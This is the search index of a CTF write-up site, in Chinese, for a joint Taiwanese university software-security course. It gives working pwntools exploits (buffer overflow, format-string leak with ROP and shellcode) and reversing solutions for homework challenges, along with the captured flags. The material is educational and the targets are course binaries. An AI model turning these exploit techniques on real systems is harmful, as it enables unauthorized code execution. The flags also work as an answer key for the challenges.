{
    "docs": [
        {
            "location": "/",
            "text": "Welcome to HackNote\n\n\nAbout me\n\n\n\n\nss8651twtw\n\n\nBambooFox\n\n\nPwn, Reverse\n\n\n\n\nContact\n\n\n\n\nFaceBook\n\n\nTwitter",
            "title": "Home"
        },
        {
            "location": "/#welcome-to-hacknote",
            "text": "",
            "title": "Welcome to HackNote"
        },
        {
            "location": "/#about-me",
            "text": "ss8651twtw  BambooFox  Pwn, Reverse",
            "title": "About me"
        },
        {
            "location": "/#contact",
            "text": "FaceBook  Twitter",
            "title": "Contact"
        },
        {
            "location": "/course/csie/",
            "text": "CSIE\n\n\n\u9019\u662f\u4e00\u9580\u53f0\u5927\u3001\u4ea4\u5927\u3001\u53f0\u79d1\u4e09\u6821\u5408\u8fa6\u7684\u7a0b\u5f0f\u5b89\u5168\u8ab2\u7a0b\uff0c\u8ab2\u7a0b\u5167\u5bb9\u6709\u53ef\u80fd\u96a8\u8457\u8001\u5e2b\u6216\u52a9\u6559\u4e0d\u540c\u800c\u6539\u8b8a\u3002106 \u4e0b\u5b78\u671f\u7684\u8ab2\u4e3b\u8981\u90fd\u662f Pwn \u548c Reverse \u5c45\u591a XD\n\n\n\u9019\u88e1\u6703\u7d00\u9304\u4e00\u4e0b\u6bcf\u9031\u7684\u4f5c\u696d\u548c\u7df4\u7fd2\u984c\u7684\u89e3\u984c\u65b9\u6cd5\u548c\u601d\u8def\uff0c\u4e5f\u6b61\u8fce\u5927\u5bb6\u767c issue \u8a0e\u8ad6\n\n\n\u984c\u76ee binary \u548c\u89e3\u984c script \u90fd\u53ef\u4ee5\u5728 \n\u9019\u88e1\n \u627e\u5230",
            "title": "Index"
        },
        {
            "location": "/course/csie/#csie",
            "text": "\u9019\u662f\u4e00\u9580\u53f0\u5927\u3001\u4ea4\u5927\u3001\u53f0\u79d1\u4e09\u6821\u5408\u8fa6\u7684\u7a0b\u5f0f\u5b89\u5168\u8ab2\u7a0b\uff0c\u8ab2\u7a0b\u5167\u5bb9\u6709\u53ef\u80fd\u96a8\u8457\u8001\u5e2b\u6216\u52a9\u6559\u4e0d\u540c\u800c\u6539\u8b8a\u3002106 \u4e0b\u5b78\u671f\u7684\u8ab2\u4e3b\u8981\u90fd\u662f Pwn \u548c Reverse \u5c45\u591a XD  \u9019\u88e1\u6703\u7d00\u9304\u4e00\u4e0b\u6bcf\u9031\u7684\u4f5c\u696d\u548c\u7df4\u7fd2\u984c\u7684\u89e3\u984c\u65b9\u6cd5\u548c\u601d\u8def\uff0c\u4e5f\u6b61\u8fce\u5927\u5bb6\u767c issue \u8a0e\u8ad6  \u984c\u76ee binary \u548c\u89e3\u984c script \u90fd\u53ef\u4ee5\u5728  \u9019\u88e1  \u627e\u5230",
            "title": "CSIE"
        },
        {
            "location": "/course/csie/practice/",
            "text": "Practice",
            "title": "Practice"
        },
        {
            "location": "/course/csie/practice/#practice",
            "text": "",
            "title": "Practice"
        },
        {
            "location": "/course/csie/hw0/",
            "text": "Hw0\n\n\npwn1\n\n\nArch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments\n\n\n\n\nconcept\n\n\nobjdump \u5f8c\u767c\u73fe main \u88e1\u9762\u662f gets \u8b80\u53d6\u8f38\u5165\uff0c\u6c92\u6709\u6aa2\u67e5\u9577\u5ea6\u6240\u4ee5\u6709 buffer overflow \u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8df3\u5230 callme \u51fd\u6578\u5373\u53ef\u62ff\u5230 shell\n\n\n\n\n\u4f7f\u7528 gdb \u6e2c\u51fa ret addr offset \u70ba 40\n\n\n\n\nexploit\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nremote\n(\n\"csie.ctf.tw\"\n,\n \n10120\n)\n\n\n\naddr\n \n=\n \n0x0000000000400566\n\n\n\nr\n.\nsendline\n(\n'a'\n \n*\n \n40\n \n+\n \np64\n(\naddr\n))\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag\n\n\nFLAG{BuFFer_0V3Rflow_is_too_easy}\n\n\nBubbleSort\n\n\nArch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n\n\n\n\nconcept\n\n\nobjdump \u5f8c\u8b80\u61c2\u7a0b\u5f0f\u908f\u8f2f\u5f8c\u767c\u73fe BubbleSort \u4e2d\u76f4\u63a5\u5c07 al \u7576\u4f5c sort \u7684\u500b\u6578\n\n\n\n\n\u800c\u539f\u5148\u8f38\u5165 sort \u500b\u6578\u7684\u503c\u5c31\u662f\u5b58\u5728 eax \u4e2d\uff0c\u4e0d\u904e\u4ed6\u6709\u5224\u65b7 sort \u500b\u6578\u4e0d\u80fd\u8d85\u904e array \u9577\u5ea6\uff0c\u4f46\u662f\u53ef\u4ee5\u8f38\u5165\u8ca0\u6578\u4f7f\u5f97 al \u7684\u503c\u8d85\u904e array \u9577\u5ea6\uff0c\u5c0e\u81f4 sort \u8d85\u904e array \u7bc4\u570d\uff0c\u5982\u6b64\u5373\u53ef\u4fee\u6539 ret addr \u8df3\u5230 DarkSoul \u51fd\u6578\u7372\u5f97 shell\n\n\n\n\n\n\nexploit\n\n\n\u5c07 127 \u683c\u5168\u90e8\u586b\u6eff DarkSoul \u7684 addr\uff0c\u63a5\u8457\u53ea\u8981 sort \u5f8c ret addr \u70ba DarkSoul addr \u5c31\u6210\u529f\uff0c\u6e2c\u8a66\u4e00\u4e0b\u767c\u73fe -1 \u5c31\u53ef\u4ee5\u4e86\n\n\n\u4e0d\u76f4\u63a5\u7b97 ret addr offset \u7684\u539f\u56e0\u662f\u56e0\u70ba\u5176\u4e2d\u7684\u6b98\u503c\u8207 DarkSoul addr \u5927\u5c0f\u95dc\u4fc2\u4e0d\u78ba\u5b9a\uff0c\u4e0d\u4e00\u5b9a\u76f4\u63a5 sort 127 + offset \u7684\u5927\u5c0f\u5c31\u80fd\u6210\u529f\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nremote\n(\n\"csie.ctf.tw\"\n,\n \n10121\n)\n\n\n\naddr\n \n=\n \n'0x08048580'\n\n\n\nr\n.\nrecvuntil\n(\n':'\n)\n\n\nr\n.\nsendline\n(\n'127'\n)\n\n\nr\n.\nrecvuntil\n(\n':'\n)\n\n\nr\n.\nsendline\n(\n'{} '\n.\nformat\n(\nstr\n(\nint\n(\naddr\n,\n \n16\n)))\n \n*\n \n127\n)\n\n\nr\n.\nrecvuntil\n(\n':'\n)\n\n\nr\n.\nsendline\n(\n'-1'\n)\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag\n\n\nFLAG{Bubble_sort_is_too_slow_and_this_question_is_too_easy}\n\n\nret222\n\n\nArch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\nFORTIFY:  Enabled\n\n\n\n\nconcept\n\n\n\u89c0\u5bdf\u5230\u8a72\u7a0b\u5f0f\u4fdd\u8b77\u5168\u958b\uff0c\u6240\u4ee5\u5148\u627e\u4e00\u4e0b\u6709\u6c92\u6709 format string \u6216 heap \u76f8\u95dc\u7684\u6f0f\u6d1e\n\n\n\u53ef\u4ee5\u767c\u73fe\u5728 Show info \u8f38\u51fa name \u7684\u6642\u5019\u6709 format string \u7684\u6f0f\u6d1e\n\n\n\n\n\u800c\u5728 Save data \u6642\u4f7f\u7528 \ngets\n \u9020\u6210 buffer overflow\n\n\n\u6240\u4ee5\u53ef\u4ee5\u5229\u7528 format string leak \u51fa code base \u548c canary\uff0c\u7136\u5f8c\u518d\u5229\u7528 buffer overflow \u505a\u51fa ROP \u8b80\u5165 shellcode \u5230 name \u4e0a\uff0c\u6700\u5f8c\u518d\u8df3\u5230 name \u4e0a\u5373\u53ef (\u7a0b\u5f0f\u6700\u5f8c\u7d50\u675f\u6642\u6703\u5c07 name \u5f8c\u7684\u4e00\u5927\u584a memory \u6b0a\u9650\u8a2d\u6210 rwx)\n\n\nexploit\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nprocess\n(\n'./ret222'\n)\n\n\n\ncontext\n.\narch\n \n=\n \n'amd64'\n\n\n\ndef\n \nsetname\n(\ndata\n):\n\n    \nr\n.\nsendlineafter\n(\n'>'\n,\n \n'1'\n)\n\n    \nr\n.\nsendafter\n(\n':'\n,\n \ndata\n)\n\n\n\ndef\n \nshowinfo\n():\n\n    \nr\n.\nsendlineafter\n(\n'>'\n,\n \n'2'\n)\n\n    \nr\n.\nrecvuntil\n(\n':'\n)\n\n\n\ndef\n \nsavedata\n(\ndata\n):\n\n    \nr\n.\nsendlineafter\n(\n'>'\n,\n \n'3'\n)\n\n    \nr\n.\nsendlineafter\n(\n':'\n,\n \ndata\n)\n\n\n\ndef\n \nex\n():\n\n    \nr\n.\nsendlineafter\n(\n'>'\n,\n \n'4'\n)\n\n\n\nsetname\n(\n\"%23$p\"\n)\n\n\nshowinfo\n()\n\n\ncanary\n \n=\n \nint\n(\nr\n.\nrecvuntil\n(\n'*'\n)[\n2\n:\n-\n1\n],\n \n16\n)\n\n\nlog\n.\ninfo\n(\nhex\n(\ncanary\n))\n\n\n\nsetname\n(\n\"%24$p\"\n)\n\n\nshowinfo\n()\n\n\nbase\n \n=\n \nint\n(\nr\n.\nrecvuntil\n(\n'*'\n)[\n2\n:\n-\n1\n],\n \n16\n)\n \n-\n \n0xd40\n\n\nlog\n.\ninfo\n(\nhex\n(\nbase\n))\n\n\n\nname\n \n=\n \nbase\n \n+\n \n0x202020\n\n\nmain\n \n=\n \nbase\n \n+\n \n0xc00\n\n\ngets\n \n=\n \nbase\n \n+\n \n0x908\n\n\npop_rdi\n \n=\n \nbase\n \n+\n \n0xda3\n\n\n\npayload\n \n=\n \n'a'\n \n*\n \n136\n \n+\n \nflat\n(\ncanary\n,\n \n'deadbeef'\n,\n \npop_rdi\n,\n \nname\n,\n \ngets\n,\n \nmain\n)\n\n\nsavedata\n(\npayload\n)\n\n\nex\n()\n\n\n\nr\n.\nsendline\n(\nasm\n(\nshellcraft\n.\nsh\n()))\n\n\n\npayload\n \n=\n \n'a'\n \n*\n \n136\n \n+\n \nflat\n(\ncanary\n,\n \n'deadbeef'\n,\n \nname\n)\n\n\nsavedata\n(\npayload\n)\n\n\nex\n()\n\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag\n\n\nFLAG{YOU_ARE_REALLY_SMART!!!!!!}\n\n\nrev1\n\n\nconcept\n\n\nobjdump \u5f8c\u767c\u73fe\u6709\u4e00\u500b print_flag \u51fd\u6578\n\n\n\n\n\u76f4\u63a5\u4f7f\u7528 gdb \u8df3\u904e\u53bb\u5c31\u6703\u5370\u51fa flag \u4e86\n\n\n\n\nflag\n\n\nFLAG{_reverse_is_fun}\n\n\nrev2\n\n\nconcept\n\n\n\u4f7f\u7528 IDA \u53cd\u7d44\u8b6f\u5f8c\u53ef\u4ee5\u767c\u73fe\u4ed6\u5c07\u8f38\u5165\u6bcf byte \u8207 0xcc \u505a xor \u5f8c\u548c\u4e00\u500b\u7279\u5b9a\u5b57\u4e32 (unk_4120BC) \u6bd4\u8f03\uff0c\u82e5\u76f8\u540c\u8f38\u5165\u5373\u70ba flag\n\n\n\n\nunk_4120BC \u5167\u5bb9\n\n\n\n\n\u5229\u7528 xor \u7684\u7279\u6027\u53ef\u77e5\u5c07 unk_4120BC \u6bcf byte xor 0xcc \u5373\u53ef\u9084\u539f\u51fa flag\n\n\nexploit\n\n\n#!/usr/bin/python3\n\n\n\nflag\n \n=\n \n[\n0x8A\n,\n \n0x80\n,\n \n0x8D\n,\n \n0x8B\n,\n \n0xB7\n,\n \n0x94\n,\n \n0xFC\n,\n \n0xBE\n,\n \n0x93\n,\n \n0xB8\n,\n \n0xA3\n,\n\n        \n0x93\n,\n \n0x8F\n,\n \n0xBE\n,\n \n0xF8\n,\n \n0xAF\n,\n \n0xA7\n,\n \n0x93\n,\n \n0x81\n,\n \n0xFF\n,\n \n0xB1\n]\n\n\n\nfor\n \ni\n \nin\n \nflag\n:\n\n    \nprint\n(\nchr\n(\ni\n \n^\n \n0xcc\n),\n \nend\n=\n''\n)\n\n\n\n\n\nflag\n\n\nFLAG{X0r_to_Cr4ck_M3}",
            "title": "Hw0"
        },
        {
            "location": "/course/csie/hw0/#hw0",
            "text": "",
            "title": "Hw0"
        },
        {
            "location": "/course/csie/hw0/#pwn1",
            "text": "Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments",
            "title": "pwn1"
        },
        {
            "location": "/course/csie/hw0/#concept",
            "text": "objdump \u5f8c\u767c\u73fe main \u88e1\u9762\u662f gets \u8b80\u53d6\u8f38\u5165\uff0c\u6c92\u6709\u6aa2\u67e5\u9577\u5ea6\u6240\u4ee5\u6709 buffer overflow \u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8df3\u5230 callme \u51fd\u6578\u5373\u53ef\u62ff\u5230 shell   \u4f7f\u7528 gdb \u6e2c\u51fa ret addr offset \u70ba 40",
            "title": "concept"
        },
        {
            "location": "/course/csie/hw0/#exploit",
            "text": "#!/usr/bin/env python  from   pwn   import   *  r   =   remote ( \"csie.ctf.tw\" ,   10120 )  addr   =   0x0000000000400566  r . sendline ( 'a'   *   40   +   p64 ( addr ))  r . interactive ()",
            "title": "exploit"
        },
        {
            "location": "/course/csie/hw0/#flag",
            "text": "FLAG{BuFFer_0V3Rflow_is_too_easy}",
            "title": "flag"
        },
        {
            "location": "/course/csie/hw0/#bubblesort",
            "text": "Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)",
            "title": "BubbleSort"
        },
        {
            "location": "/course/csie/hw0/#concept_1",
            "text": "objdump \u5f8c\u8b80\u61c2\u7a0b\u5f0f\u908f\u8f2f\u5f8c\u767c\u73fe BubbleSort \u4e2d\u76f4\u63a5\u5c07 al \u7576\u4f5c sort \u7684\u500b\u6578   \u800c\u539f\u5148\u8f38\u5165 sort \u500b\u6578\u7684\u503c\u5c31\u662f\u5b58\u5728 eax \u4e2d\uff0c\u4e0d\u904e\u4ed6\u6709\u5224\u65b7 sort \u500b\u6578\u4e0d\u80fd\u8d85\u904e array \u9577\u5ea6\uff0c\u4f46\u662f\u53ef\u4ee5\u8f38\u5165\u8ca0\u6578\u4f7f\u5f97 al \u7684\u503c\u8d85\u904e array \u9577\u5ea6\uff0c\u5c0e\u81f4 sort \u8d85\u904e array \u7bc4\u570d\uff0c\u5982\u6b64\u5373\u53ef\u4fee\u6539 ret addr \u8df3\u5230 DarkSoul \u51fd\u6578\u7372\u5f97 shell",
            "title": "concept"
        },
        {
            "location": "/course/csie/hw0/#exploit_1",
            "text": "\u5c07 127 \u683c\u5168\u90e8\u586b\u6eff DarkSoul \u7684 addr\uff0c\u63a5\u8457\u53ea\u8981 sort \u5f8c ret addr \u70ba DarkSoul addr \u5c31\u6210\u529f\uff0c\u6e2c\u8a66\u4e00\u4e0b\u767c\u73fe -1 \u5c31\u53ef\u4ee5\u4e86  \u4e0d\u76f4\u63a5\u7b97 ret addr offset \u7684\u539f\u56e0\u662f\u56e0\u70ba\u5176\u4e2d\u7684\u6b98\u503c\u8207 DarkSoul addr \u5927\u5c0f\u95dc\u4fc2\u4e0d\u78ba\u5b9a\uff0c\u4e0d\u4e00\u5b9a\u76f4\u63a5 sort 127 + offset \u7684\u5927\u5c0f\u5c31\u80fd\u6210\u529f  #!/usr/bin/env python  from   pwn   import   *  r   =   remote ( \"csie.ctf.tw\" ,   10121 )  addr   =   '0x08048580'  r . recvuntil ( ':' )  r . sendline ( '127' )  r . recvuntil ( ':' )  r . sendline ( '{} ' . format ( str ( int ( addr ,   16 )))   *   127 )  r . recvuntil ( ':' )  r . sendline ( '-1' )  r . interactive ()",
            "title": "exploit"
        },
        {
            "location": "/course/csie/hw0/#flag_1",
            "text": "FLAG{Bubble_sort_is_too_slow_and_this_question_is_too_easy}",
            "title": "flag"
        },
        {
            "location": "/course/csie/hw0/#ret222",
            "text": "Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\nFORTIFY:  Enabled",
            "title": "ret222"
        },
        {
            "location": "/course/csie/hw0/#concept_2",
            "text": "\u89c0\u5bdf\u5230\u8a72\u7a0b\u5f0f\u4fdd\u8b77\u5168\u958b\uff0c\u6240\u4ee5\u5148\u627e\u4e00\u4e0b\u6709\u6c92\u6709 format string \u6216 heap \u76f8\u95dc\u7684\u6f0f\u6d1e  \u53ef\u4ee5\u767c\u73fe\u5728 Show info \u8f38\u51fa name \u7684\u6642\u5019\u6709 format string \u7684\u6f0f\u6d1e   \u800c\u5728 Save data \u6642\u4f7f\u7528  gets  \u9020\u6210 buffer overflow  \u6240\u4ee5\u53ef\u4ee5\u5229\u7528 format string leak \u51fa code base \u548c canary\uff0c\u7136\u5f8c\u518d\u5229\u7528 buffer overflow \u505a\u51fa ROP \u8b80\u5165 shellcode \u5230 name \u4e0a\uff0c\u6700\u5f8c\u518d\u8df3\u5230 name \u4e0a\u5373\u53ef (\u7a0b\u5f0f\u6700\u5f8c\u7d50\u675f\u6642\u6703\u5c07 name \u5f8c\u7684\u4e00\u5927\u584a memory \u6b0a\u9650\u8a2d\u6210 rwx)",
            "title": "concept"
        },
        {
            "location": "/course/csie/hw0/#exploit_2",
            "text": "#!/usr/bin/env python  from   pwn   import   *  r   =   process ( './ret222' )  context . arch   =   'amd64'  def   setname ( data ): \n     r . sendlineafter ( '>' ,   '1' ) \n     r . sendafter ( ':' ,   data )  def   showinfo (): \n     r . sendlineafter ( '>' ,   '2' ) \n     r . recvuntil ( ':' )  def   savedata ( data ): \n     r . sendlineafter ( '>' ,   '3' ) \n     r . sendlineafter ( ':' ,   data )  def   ex (): \n     r . sendlineafter ( '>' ,   '4' )  setname ( \"%23$p\" )  showinfo ()  canary   =   int ( r . recvuntil ( '*' )[ 2 : - 1 ],   16 )  log . info ( hex ( canary ))  setname ( \"%24$p\" )  showinfo ()  base   =   int ( r . recvuntil ( '*' )[ 2 : - 1 ],   16 )   -   0xd40  log . info ( hex ( base ))  name   =   base   +   0x202020  main   =   base   +   0xc00  gets   =   base   +   0x908  pop_rdi   =   base   +   0xda3  payload   =   'a'   *   136   +   flat ( canary ,   'deadbeef' ,   pop_rdi ,   name ,   gets ,   main )  savedata ( payload )  ex ()  r . sendline ( asm ( shellcraft . sh ()))  payload   =   'a'   *   136   +   flat ( canary ,   'deadbeef' ,   name )  savedata ( payload )  ex ()  r . interactive ()",
            "title": "exploit"
        },
        {
            "location": "/course/csie/hw0/#flag_2",
            "text": "FLAG{YOU_ARE_REALLY_SMART!!!!!!}",
            "title": "flag"
        },
        {
            "location": "/course/csie/hw0/#rev1",
            "text": "",
            "title": "rev1"
        },
        {
            "location": "/course/csie/hw0/#concept_3",
            "text": "objdump \u5f8c\u767c\u73fe\u6709\u4e00\u500b print_flag \u51fd\u6578   \u76f4\u63a5\u4f7f\u7528 gdb \u8df3\u904e\u53bb\u5c31\u6703\u5370\u51fa flag \u4e86",
            "title": "concept"
        },
        {
            "location": "/course/csie/hw0/#flag_3",
            "text": "FLAG{_reverse_is_fun}",
            "title": "flag"
        },
        {
            "location": "/course/csie/hw0/#rev2",
            "text": "",
            "title": "rev2"
        },
        {
            "location": "/course/csie/hw0/#concept_4",
            "text": "\u4f7f\u7528 IDA \u53cd\u7d44\u8b6f\u5f8c\u53ef\u4ee5\u767c\u73fe\u4ed6\u5c07\u8f38\u5165\u6bcf byte \u8207 0xcc \u505a xor \u5f8c\u548c\u4e00\u500b\u7279\u5b9a\u5b57\u4e32 (unk_4120BC) \u6bd4\u8f03\uff0c\u82e5\u76f8\u540c\u8f38\u5165\u5373\u70ba flag   unk_4120BC \u5167\u5bb9   \u5229\u7528 xor \u7684\u7279\u6027\u53ef\u77e5\u5c07 unk_4120BC \u6bcf byte xor 0xcc \u5373\u53ef\u9084\u539f\u51fa flag",
            "title": "concept"
        },
        {
            "location": "/course/csie/hw0/#exploit_3",
            "text": "#!/usr/bin/python3  flag   =   [ 0x8A ,   0x80 ,   0x8D ,   0x8B ,   0xB7 ,   0x94 ,   0xFC ,   0xBE ,   0x93 ,   0xB8 ,   0xA3 , \n         0x93 ,   0x8F ,   0xBE ,   0xF8 ,   0xAF ,   0xA7 ,   0x93 ,   0x81 ,   0xFF ,   0xB1 ]  for   i   in   flag : \n     print ( chr ( i   ^   0xcc ),   end = '' )",
            "title": "exploit"
        },
        {
            "location": "/course/csie/hw0/#flag_4",
            "text": "FLAG{X0r_to_Cr4ck_M3}",
            "title": "flag"
        },
        {
            "location": "/course/csie/hw1/",
            "text": "Hw1\n\n\nhw1\n\n\nconcept\n\n\n\n\nnormal work\n\n\n\u8b80\u61c2\u7d44\u8a9e\u4e2d\u52a0\u5bc6\u51fd\u5f0f\u7684\u884c\u70ba\u5f8c\u4fbf\u53ef\u4ee5\u53cd\u5411\u89e3\u51fa\u88ab\u52a0\u5bc6\u7684 flag\n\n\n\n\n\n\n\n\n\n\n\n\ndirty work\n\n\n\u89c0\u5bdf\u5230\u8a72\u7a0b\u5f0f\u662f\u6bcf\u6b21\u52a0\u5bc6\u4e00\u500b byte\uff0c\u4e14\u6bcf\u500b byte \u4e92\u76f8\u7368\u7acb\u4e0d\u5f71\u97ff\u52a0\u5bc6\u8a08\u7b97\u3002\u5982\u6b64\u5373\u53ef\u66b4\u529b\u7aae\u8209\u51fa\u6240\u6709\u53ef\u8996\u5b57\u5143\uff0c\u4f9d\u5e8f\u7834\u89e3\u6bcf\u4e00\u500b byte\n\n\n\n\n\n\n\n\nexploit\n\n\n\n\nnormal work\n\n\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \nstruct\n \nimport\n \n*\n\n\n\nwith\n \nopen\n(\n'flag'\n)\n \nas\n \nfd\n:\n \n    \ndata\n \n=\n \nfd\n.\nread\n()\n\n\n\ndata\n \n=\n \nunpack\n(\n'<{}i'\n.\nformat\n(\nlen\n(\ndata\n)\n \n/\n \n4\n),\n \ndata\n)\n\n\n\ndef\n \nencrypt\n(\ndata\n):\n\n    \nfor\n \nidx\n,\n \nitem\n \nin\n \nenumerate\n(\ndata\n):\n\n        \ntmp\n \n=\n \n(\n2\n \n+\n \nidx\n)\n \n*\n \n0xcccccccd\n\n        \nD\n \n=\n \ntmp\n \n>>\n \n32\n\n        \nA\n \n=\n \ntmp\n \n&\n \n0xffffffff\n\n        \nD\n \n>>=\n \n3\n\n        \nA\n \n=\n \nD\n \n*\n \n10\n\n        \nC\n \n=\n \n(\n2\n \n+\n \nidx\n \n-\n \nA\n)\n \n&\n \n0xff\n\n        \nD\n \n=\n \nidx\n \n+\n \n1\n \n        \nD\n \n<<=\n \nC\n\n        \nprint\n \nhex\n(\nord\n(\nitem\n)\n \n*\n \nD\n \n+\n \n0x2333\n)\n\n    \nreturn\n\n\n\ndef\n \ndecrypt\n(\ndata\n):\n\n    \nans\n \n=\n \n''\n\n    \nfor\n \nidx\n,\n \nitem\n \nin\n \nenumerate\n(\ndata\n):\n\n        \ntmp\n \n=\n \n(\n2\n \n+\n \nidx\n)\n \n*\n \n0xcccccccd\n\n        \nD\n \n=\n \ntmp\n \n>>\n \n32\n\n        \nA\n \n=\n \ntmp\n \n&\n \n0xffffffff\n\n        \nD\n \n>>=\n \n3\n\n        \nA\n \n=\n \nD\n \n*\n \n10\n\n        \nC\n \n=\n \n(\n2\n \n+\n \nidx\n \n-\n \nA\n)\n \n&\n \n0xff\n\n        \nD\n \n=\n \nidx\n \n+\n \n1\n \n        \nD\n \n<<=\n \nC\n\n        \nans\n \n+=\n \nchr\n((\nitem\n \n-\n \n0x2333\n)\n \n/\n \nD\n)\n\n    \nprint\n \nans\n \n    \nreturn\n\n\n\ndecrypt\n(\ndata\n)\n\n\n\n\n\n\n\ndirty work\n\n\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nimport\n \nstring\n\n\nimport\n \nos\n\n\n\nwith\n \nopen\n(\n'ans'\n)\n \nas\n \nfd\n:\n \n    \nans\n \n=\n \nfd\n.\nread\n()\n\n\n\ndef\n \ngen_ans\n(\ndata\n):\n\n    \nos\n.\nsystem\n(\n'echo \n\\'\n{}\n\\'\n | ./hw1 '\n.\nformat\n(\ndata\n))\n\n    \nwith\n \nopen\n(\n'flag'\n)\n \nas\n \nfd\n:\n \n        \nres\n \n=\n \nfd\n.\nread\n()\n\n    \nreturn\n \nres\n \n\n\ntest_ans\n \n=\n \n'FLAG{'\n\n\n\nfor\n \nk\n \nin\n \nxrange\n(\n33\n):\n\n    \nfor\n \ni\n \nin\n \nstring\n.\nprintable\n:\n\n        \nif\n \nans\n.\nstartswith\n(\ngen_ans\n(\ntest_ans\n \n+\n \ni\n)):\n\n            \ntest_ans\n \n+=\n \ni\n\n            \nbreak\n\n\n\nprint\n \ntest_ans\n\n\n\n\n\nflag\n\n\nFLAG{Iost4SXskSmu53CbCAI5e52FBJkj1JKl}",
            "title": "Hw1"
        },
        {
            "location": "/course/csie/hw1/#hw1",
            "text": "",
            "title": "Hw1"
        },
        {
            "location": "/course/csie/hw1/#hw1_1",
            "text": "",
            "title": "hw1"
        },
        {
            "location": "/course/csie/hw1/#concept",
            "text": "normal work  \u8b80\u61c2\u7d44\u8a9e\u4e2d\u52a0\u5bc6\u51fd\u5f0f\u7684\u884c\u70ba\u5f8c\u4fbf\u53ef\u4ee5\u53cd\u5411\u89e3\u51fa\u88ab\u52a0\u5bc6\u7684 flag       dirty work  \u89c0\u5bdf\u5230\u8a72\u7a0b\u5f0f\u662f\u6bcf\u6b21\u52a0\u5bc6\u4e00\u500b byte\uff0c\u4e14\u6bcf\u500b byte \u4e92\u76f8\u7368\u7acb\u4e0d\u5f71\u97ff\u52a0\u5bc6\u8a08\u7b97\u3002\u5982\u6b64\u5373\u53ef\u66b4\u529b\u7aae\u8209\u51fa\u6240\u6709\u53ef\u8996\u5b57\u5143\uff0c\u4f9d\u5e8f\u7834\u89e3\u6bcf\u4e00\u500b byte",
            "title": "concept"
        },
        {
            "location": "/course/csie/hw1/#exploit",
            "text": "normal work   #!/usr/bin/env python  from   struct   import   *  with   open ( 'flag' )   as   fd :  \n     data   =   fd . read ()  data   =   unpack ( '<{}i' . format ( len ( data )   /   4 ),   data )  def   encrypt ( data ): \n     for   idx ,   item   in   enumerate ( data ): \n         tmp   =   ( 2   +   idx )   *   0xcccccccd \n         D   =   tmp   >>   32 \n         A   =   tmp   &   0xffffffff \n         D   >>=   3 \n         A   =   D   *   10 \n         C   =   ( 2   +   idx   -   A )   &   0xff \n         D   =   idx   +   1  \n         D   <<=   C \n         print   hex ( ord ( item )   *   D   +   0x2333 ) \n     return  def   decrypt ( data ): \n     ans   =   '' \n     for   idx ,   item   in   enumerate ( data ): \n         tmp   =   ( 2   +   idx )   *   0xcccccccd \n         D   =   tmp   >>   32 \n         A   =   tmp   &   0xffffffff \n         D   >>=   3 \n         A   =   D   *   10 \n         C   =   ( 2   +   idx   -   A )   &   0xff \n         D   =   idx   +   1  \n         D   <<=   C \n         ans   +=   chr (( item   -   0x2333 )   /   D ) \n     print   ans  \n     return  decrypt ( data )    dirty work   #!/usr/bin/env python  from   pwn   import   *  import   string  import   os  with   open ( 'ans' )   as   fd :  \n     ans   =   fd . read ()  def   gen_ans ( data ): \n     os . system ( 'echo  \\' {} \\'  | ./hw1 ' . format ( data )) \n     with   open ( 'flag' )   as   fd :  \n         res   =   fd . read () \n     return   res   test_ans   =   'FLAG{'  for   k   in   xrange ( 33 ): \n     for   i   in   string . printable : \n         if   ans . startswith ( gen_ans ( test_ans   +   i )): \n             test_ans   +=   i \n             break  print   test_ans",
            "title": "exploit"
        },
        {
            "location": "/course/csie/hw1/#flag",
            "text": "FLAG{Iost4SXskSmu53CbCAI5e52FBJkj1JKl}",
            "title": "flag"
        },
        {
            "location": "/course/csie/hw2/",
            "text": "Hw2\n\n\ngothijack\n\n\nArch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments\n\n\n\n\nconcept\n\n\n\u8a72\u7a0b\u5f0f\u5f88\u55ae\u7d14\u7684\u505a\u4e86\u56db\u4ef6\u4e8b\n\n\n\n\n\u8f38\u5165 name\n\n\n\u8f38\u5165\u60f3\u4fee\u6539\u7684 address\n\n\n\u8f38\u5165\u60f3\u4fee\u6539\u7684\u503c\n\n\n\u8f38\u51fa done !\n\n\n\n\n\u4f9d\u984c\u76ee\u63d0\u793a\u53ef\u77e5\u662f\u4f7f\u7528 got hijack \u7684\u6280\u5de7\u4f86\u9054\u6210\u653b\u64ca\uff0c\u4e0d\u904e\u9019\u984c\u6709 canary \u4e0d\u80fd\u76f4\u63a5 overflow \u9020\u51fa ROP chain\n\n\n\u4e0d\u904e\u6709\u500b\u53ef\u4ee5\u53ef\u63a7\u7684 buffer \u53ef\u4ee5\u5229\u7528\uff0c\u4f7f\u7528 gdb 